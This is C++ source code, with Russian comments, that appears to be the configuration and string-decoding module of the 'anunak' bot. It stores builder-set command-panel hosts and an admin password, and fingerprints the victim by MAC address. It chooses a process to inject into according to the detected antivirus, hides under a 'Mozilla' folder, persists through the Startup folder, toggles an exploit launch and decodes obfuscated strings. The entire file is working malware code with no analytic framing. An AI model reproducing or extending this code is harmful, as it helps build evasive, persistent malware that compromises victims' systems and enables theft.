#include "main.h"
#include "AV.h"
#include "core\misc.h"
#include "core\crypt.h"
#include "core\file.h"
#include "core\util.h"

namespace Config
{
//данные заполняемые билдером
char PeriodConnect[MaxSizePeriodConnect] = PERIOD_CONTACT;
char Prefix[MaxSizePrefix] = PREFIX_NAME;
char Hosts[MaxSizeHostAdmin] = ADMIN_PANEL_HOSTS;
char HostsAZ[MaxSizeHostAdmin] = ADMIN_AZ;
char UserAZ[MaxSizeUserAZ] = USER_AZ;
char VideoServers[MaxSizeIpVideoServer] = VIDEO_SERVER_IP;
char FlagsVideoServer[MaxFlagsVideoServer] = FLAGS_VIDEO_SERVER;
char Password[MaxSizePasswordAdmin] = ADMIN_PASSWORD;
byte RandVector[MaxSizeRandVector] = MASK_RAND_VECTOR;
char MiscState[MaxSizeMiscState] = MISC_STATE;
char PublicKey[MaxSizePublicKey] = PUBLIC_KEY;
char DateWork[MaxSizeDateWork] = DATE_WORK;
char TableDecodeString[256]; //таблица для перекодировки символов в зашифрованной строке

#ifdef IP_SERVER_EXTERNAL_IP
char ExternalIP[48] = "EXTERNAL_IP";
#endif

//данные заполняемые при старте бота
char UID[32];
//маска накладываемая на строки с целью генерации случайных (уникальных) имен
char XorMask[32];
int waitPeriod;

char nameManager[32];
char fileNameBot[MAX_PATH]; //имя автозагрузочного файла бота
char fileNameConfig[MAX_PATH];
char nameService[64];
char TempNameFolder[16]; //случайное имя папки во временной папке, куда будут ложиться файлы которые нельзя отослать через пайпы

char* BotVersion = _CT_("1.3");

//данные для генератора случайных чисел используемый для декодировки
uint randA, randB, randR;
HANDLE botMutex = 0;
int AV = 0;
char exeDonor[MAX_PATH]; //имя ехе в который внедряемся вместо svchost.exe
uint state = 0;

//создает уид бота и маску для генерации случайных имен
static bool GenUID()
{
	byte buf[128];
	int c_macAddress = GetMacAddress(buf);
	//мак адрес занимает 6 байт
	int hash1 = c_macAddress > 0 ? (*((DWORD*)buf) ^ *((DWORD*)(buf + 2))) : 0;
	DWORD c_compName = sizeof(buf) - c_macAddress;
	API(KERNEL32, GetComputerNameA)( (char*)buf + c_macAddress, &c_compName );
	uint hash2 = CalcHash( buf, c_macAddress + c_compName );
	//маску делаем на основе уида без префикса
	Str::Format( XorMask, _CS_("%08x%08x"), hash1, hash2 );
	//формируем уид с префиксом
	StringBuilderStack<sizeof(UID)> _UID;
	_UID += DECODE_STRING(Prefix);
	_UID += '0';
	_UID += XorMask;
	Str::Copy( UID, _UID, _UID.Len() );
	return true;
}

static uint DecodeGenRand()
{
	randR = (randR * randA + randB) & 0xffff;
	return randR;
}

static void ExchangeDist( char* table, int p1, int p2, int count )
{
	int dist = p2 - p1 + 1;
	for( int i = 0; i < count; i++ )
	{
		int i1 = (DecodeGenRand() % dist) + p1;
		int i2 = (DecodeGenRand() % dist) + p1;
		char t = table[i1];
		table[i1] = table[i2];
		table[i2] = t;
	}
}

static void InitDecodeTable()
{
	char table[256];
	for( int i = 0; i < 256; i++ )
		table[i] = i;
	int exchanges = (randR % 1000) + 128;
	ExchangeDist( table, 1, 31, exchanges ); //тасование кодов меньше пробела
	ExchangeDist( table, 32, 127, exchanges ); //тасование ascii кодов
	ExchangeDist( table, 128, 255, exchanges ); //тасование русских символов
	for( int i = 0; i < 256; i++ )
		TableDecodeString[ table[i] ] = i;
}

bool Init()
{
	state = 0;
	//извлекаем коэффициенты для генератора случайных чисел
	int n = MaxSizeRandVector - sizeof(ushort) * 3;
	randR = *((ushort*)&RandVector[n]);
	randA = *((ushort*)&RandVector[n + 2]);
	randB = *((ushort*)&RandVector[n + 4]);
	//инициализация таблицы перекодировки
	InitDecodeTable();
	GenUID();

	waitPeriod = Str::ToInt( DECODE_STRING(PeriodConnect) ) * 1000;
	if( waitPeriod <= 0 ) waitPeriod = 10 * 60 * 1000; //по умолчанию раз в 10 минут

	StringBuilder randName( TempNameFolder, sizeof(TempNameFolder), 0 );
	Rand::Gen( randName, 8, 14 );
	fileNameConfig[0] = 0;
	char miscState[MaxSizeMiscState];
	Str::Copy( miscState, sizeof(miscState), DECODE_STRING(MiscState) );

	if( miscState[0] == '0' ) //отключена инсталяция в автозагрузку
	{
		state |= NOT_INSTALL_SERVICE | NOT_INSTALL_AUTORUN;
		DbgMsg( "Отключена инсталяция в автозагрузку" );
	}
	if( miscState[1] == '0' ) //отключен запуск сплойта
	{
		state |= SPLOYTY_OFF;
		DbgMsg( "Отключен запуск сплойта" );
	}
	if( miscState[2] == '1' )
	{
		state |= CHECK_DUPLICATION;
		DbgMsg( "Включена проверка запуска копии" );
	}
	if( miscState[3] == '1' )
	{
		state |= PLUGINS_SERVER;
		DbgMsg( "Плагины закачиваются в сервера" );
	}
	if( miscState[4] == '1' )
	{
		state |= NOT_USED_SCVHOST;
		DbgMsg( "Работаем в текущем процессе без инжекта в svchost.exe" );
	}
	AV = AVDetect();
	DbgMsg( "AVDetect %d", AV );
	exeDonor[0] = 0;
	if( AV == AV_AVG )
	{
		Str::Copy( exeDonor, sizeof(exeDonor), _CS_("WindowsPowerShell\\v1.0\\powershell.exe") );
	}
	else if( AV == AV_TrandMicro )
	{
		StringBuilder path( exeDonor, sizeof(exeDonor) );
		bool res = Path::GetCSIDLPath(CSIDL_PROGRAM_FILESX86, path );
		if( !res )
			res = Path::GetCSIDLPath(CSIDL_PROGRAM_FILESX86, path );
//		DbgMsg( "%s", exeDonor );
		if( res )
			Path::AppendFile( path, _CS_("Internet Explorer\\iexplore.exe") );
		else
			Str::Copy( exeDonor, sizeof(exeDonor), _CS_("mstsc.exe") );
	}
	return true;
}

bool InitFileConfig( bool def )
{
	//формируем имя конфиг файла
	StringBuilderStack<32> name;
	Crypt::Name( _CS_("anunak_config"), XorMask, name );
	name += _CS_(".bin");
	StringBuilder configName( fileNameConfig, sizeof(fileNameConfig) );
	if( def )
		GetDefBotFolder(configName);
	else
		GetBotFolder(configName);
	Path::AppendFile( configName, name );
	DbgMsg( "Конфигурационный файл: %s", configName.c_str() );
	return true;
}

bool GetDefBotFolder( StringBuilder& path, const char* addFolder, bool cryptAddFolder )
{
	Path::GetCSIDLPath( CSIDL_COMMON_APPDATA, path, _CS_("Mozilla") );
	Path::CreateDirectory(path);
	if( addFolder )
	{
		StringBuilder name;
		if( cryptAddFolder )
			Crypt::Name( addFolder, XorMask, name );
		else
			name = addFolder;
		Path::AppendFile( path, name );
		Path::CreateDirectory(path);
	}
	return true;
}

bool GetBotFolder( StringBuilder& path, const char* addFolder, bool cryptAddFolder )
{
	path = Config::fileNameBot;
	if( path.Len() < 10 ) return false;
	Path::GetPathName(path);
	if( addFolder )
	{
		StringBuilder name;
		if( cryptAddFolder )
			Crypt::Name( addFolder, XorMask, name );
		else
			name = addFolder;
		Path::AppendFile( path, name );
		Path::CreateDirectory(path);
	}

	return true;
}


bool GetBotFile( StringBuilder& fileName, const char* name )
{
	fileName.Grow(MAX_PATH);
	if( GetBotFolder(fileName) )
	{
		StringBuilder name2;
		Crypt::Name( name, XorMask, name2 );
		name2 += _CS_(".txt");
		Path::AppendFile( fileName, name2 );
		return true;
	}
	return false;
}

static bool GetFileNameForNameManager( StringBuilder& fileName )
{
	return GetBotFile( fileName, _CS_("NameManager") );
}

bool SaveNameManager()
{
	StringBuilderStack<MAX_PATH> fileName;
	if( GetFileNameForNameManager(fileName) )
	{
		DbgMsg( "Имя менеджера сохранили в %s", fileName.c_str() );
		return File::WriteAll( fileName, nameManager, Str::Len(nameManager) );
	}
	return false;
}

bool LoadNameManager( bool del )
{
	StringBuilderStack<MAX_PATH> fileName;
	if( GetFileNameForNameManager(fileName) )
	{
		Mem::Data data;
		if( File::ReadAll( fileName, data ) )
		{
			DbgMsg( "Загрузили имя менеджера с %s", fileName.c_str() );
			if( del ) File::Delete(fileName);
			if( data.Len() > 10 )
			{
				Str::Copy( nameManager, sizeof(nameManager), data.p_char(), data.Len() );
				return true;
			}
		}
	}
	return false;
}

StringBuilder& NameBotExe( StringBuilder& name )
{
	Crypt::Name(_CS_("anunak"), XorMask, name );
	return name += _CS_(".exe");
}

StringBuilder& FullNameBotExe( StringBuilder& path )
{
	StringBuilderStack<MAX_PATH> startup;
	Path::GetStartupUser(startup);
	StringBuilderStack<32> name;
	NameBotExe(name);
	return Path::Combine( path, startup, name );
}

StringBuilder& NameUserAZ( StringBuilder& userAZ )
{
	userAZ = DECODE_STRING(UserAZ);
	return userAZ;
}

static void CreateNameMutex( StringBuilder& name )
{
	Crypt::Name( _CS_("anunak_mutex"), Config::XorMask, name );
}

bool CreateMutex()
{
	StringBuilderStack<32> name;
	CreateNameMutex(name);
	botMutex = Mutex::Create(name);
	if( botMutex )
		return true;
	return false;
}

void ReleaseMutex()
{
	if( botMutex )
	{
		Mutex::Release(botMutex);
		botMutex = 0;
	}
}

bool GetSleepingFileName( StringBuilder& fileName )
{
	return Config::GetBotFile( fileName, _CS_("date_sleep") );
}

bool IsSleeping()
{
	StringBuilderStack<MAX_PATH> fileName;
	if( !GetSleepingFileName(fileName) ) return false;
	Mem::Data date2;
	bool ret = false;
	if( File::ReadAll( fileName, date2 ) )
	{
		SYSTEMTIME st;
		API(KERNEL32, GetLocalTime)(&st);
		StruSleep* date = (StruSleep*)date2.Ptr();
		uint d1 = date->year * 10000 + date->month * 100 + date->day;
		uint d2 = st.wYear * 10000 + st.wMonth * 100 + st.wDay;
		if( d1 > d2 ) //еще нужно спать
		{
			ret = true;
		}
		else
		{
			File::Delete(fileName);
		}
	}
	return ret;
}

void DelSleeping()
{
	StringBuilderStack<MAX_PATH> fileName;
	if( GetSleepingFileName(fileName) )
		File::Delete(fileName);
}

uint GetDateWork()
{
	return Str::ToInt( DECODE_STRING(DateWork) );
}

};

#ifdef ON_CODE_STRING
//определяем функцию для декодирования зашифрованных строк
StringDecoded DECODE_STRING( const char* codeStr )
{
	return StringDecoded( DECODE_STRING2(codeStr) );
}

char* DECODE_STRING2( const char* codeStr )
{
	int len = Str::Len(codeStr) - CountStringOpcode; //реальная длина строки
	if( len < 0 ) len = 0; //если закодирована пустая строка
	char* s = Str::Alloc(len + 1);
	int lenBlock = len / CountStringOpcode;
	int nb = 0; //номер блока
	int rb = 0; //сколько символов осталось в блоке
	int delta = 0;
	int n = 0;
	int i = 0;
	while( n < len )
	{
		if( rb == 0 )
		{
			nb++;
			if( nb <= CountStringOpcode )
			{
				delta = codeStr[i] - 'a';
				i++;
				rb = lenBlock;
			}
			else
				rb = len - n;
		}
		if( rb > 0 )
		{
			rb--;
			int c = codeStr[i];
			int min, max;
			if( c < 32 )
				min = 1, max = 31;
			else if( c < 128 )
				min = 32, max = 127;
			else
				min = 128, max = 255;
			c = Config::TableDecodeString[c];
			c -= delta;
			if( c < min ) c = max - min + c;
			s[n++] = c;
			i++;
		}
	}
	s[n] = 0;
	return s;
}

StringDecodedW DECODE_STRINGW( const char* codeStr )
{
	return StringDecodedW( DECODE_STRINGW2(codeStr) );
}

wchar_t* DECODE_STRINGW2( const char* codeStr )
{
	return Str::ToWideChar( DECODE_STRING(codeStr) );
}

#else

char* DECODE_STRING2( const char* codeStr )
{
	return Str::Duplication(codeStr);
}

StringDecodedW DECODE_STRINGW( const char* codeStr )
{
	return StringDecodedW( DECODE_STRINGW2(codeStr) );
}

wchar_t* DECODE_STRINGW2( const char* codeStr )
{
	return Str::ToWideChar(codeStr);
}

#endif //ON_CODE_STRING
